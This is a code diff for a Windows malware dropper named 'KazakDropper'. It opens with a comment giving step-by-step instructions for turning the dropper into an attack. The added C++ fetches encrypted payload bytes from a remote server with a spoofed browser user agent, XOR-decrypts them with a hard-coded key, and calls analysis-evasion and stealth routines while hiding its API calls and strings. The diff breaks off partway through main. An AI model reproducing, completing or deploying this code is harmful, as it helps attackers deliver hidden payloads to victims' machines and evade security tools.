@@ -1,3 +1,13 @@
+
+/* How to create an attack using this dropper you may ask, well i gotchu
+
+1. Get your DLL bytes using a Hex Editor and export them as C bytes
+2. Encrypt your DLL bytes using the same algorithm used to decrypt them here and put them inside a text file on your server.
+3. Put the link inside the source code.
+4. That's it , enjoy.
+
+*/
+
 #include "../headers/Kazak.h"
 
 #pragma comment(linker, "/arch:x86")
@@ -63,57 +73,49 @@ void KazakDropper::Stealth()
 	std::this_thread::sleep_for(std::chrono::seconds(5));
 }
 
+std::string KazakUtils::FileToString(std::wstring URL)
+{
+	const wchar_t* header = enc(L"Accept: *" "/" "*\r\n\r\n");
+	HANDLE hInterWebz = InternetOpenA(enc("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+	HANDLE hURL = li(InternetOpenUrl)(hInterWebz, URL.c_str(), header, lstrlen(header), INTERNET_FLAG_DONT_CACHE, 0);
+
+	char* Buffer = new char[100000000]; //100mb
+	memset(Buffer, 0, 100000000);
+	DWORD BytesRead = 1;
+
+	std::string data;
+
+	if (li(InternetReadFile)(hURL, Buffer, 100000000, &BytesRead))
+	{
+		data = std::string(Buffer);
+	}
+
+	delete[] Buffer;
+	li(InternetCloseHandle)(hInterWebz);
+	li(InternetCloseHandle)(hURL);
+
+	return data;
+}
+
 void KazakDropper::PrepareExe()
 {
-	char* ExeBytes;
+	Storage S;
+	S.BytesStorage = KazakUtils::FileToString(enc(L"link to the raw link where the bytes are stored"));
+	S.Key = enc("KazakDropper");
 
+	for (int x = 0; x < 10; x++)
+		S.DecryptedBytes[x] = S.BytesStorage[x] ^ S.Key[x];
+	
 }
-
-std::string KazakUtils::replace_all(std::string subject, const std::string& search, const std::string& replace)
-{
-	size_t pos = 0;
-	while ((pos = subject.find(search, pos)) != std::string::npos)
-	{
-		subject.replace(pos, search.length(), replace);
-		pos += replace.length();
-	}
-	return subject;
-}
-
-std::string StringWrapper(const std::string url)
-{
-	const HINTERNET connection = li(InternetOpenA)(enc("list_access\r\n"), INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, NULL);
-	std::string rtn;
-	if (connection)
-	{
-		const HINTERNET url_file = li(InternetOpenUrlA)(connection, url.c_str(), nullptr, NULL, NULL, NULL);
-		if (url_file)
-		{
-			char buffer[2000];
-			DWORD bytes_read;
-			do
-			{
-				li(InternetReadFile)(url_file, buffer, 2000, &bytes_read);
-				rtn.append(buffer, bytes_read);
-				memset(buffer, 0, 2000);
-			} while (bytes_read);
-			li(InternetCloseHandle)(connection);
-			li(InternetCloseHandle)(url_file);
-			std::string p = KazakUtils::replace_all(rtn, "|n", "\r\n");
-			return p;
-		}
-	}
-	li(InternetCloseHandle)(connection);
-	std::string p = KazakUtils::replace_all(rtn, "|n", "\r\n");
-	return p;
-}
-
 
 int main()
 {
 	while (!KazakDropper::EvadeAnalysis())
 	{
 		KazakDropper::Stealth();
+
+		while (!li(InternetCheckConnectionA)(enc("https://google.com"), FLAG_ICC_FORCE_CONNECTION, 0))
+			Sleep(1000);
 
 
 
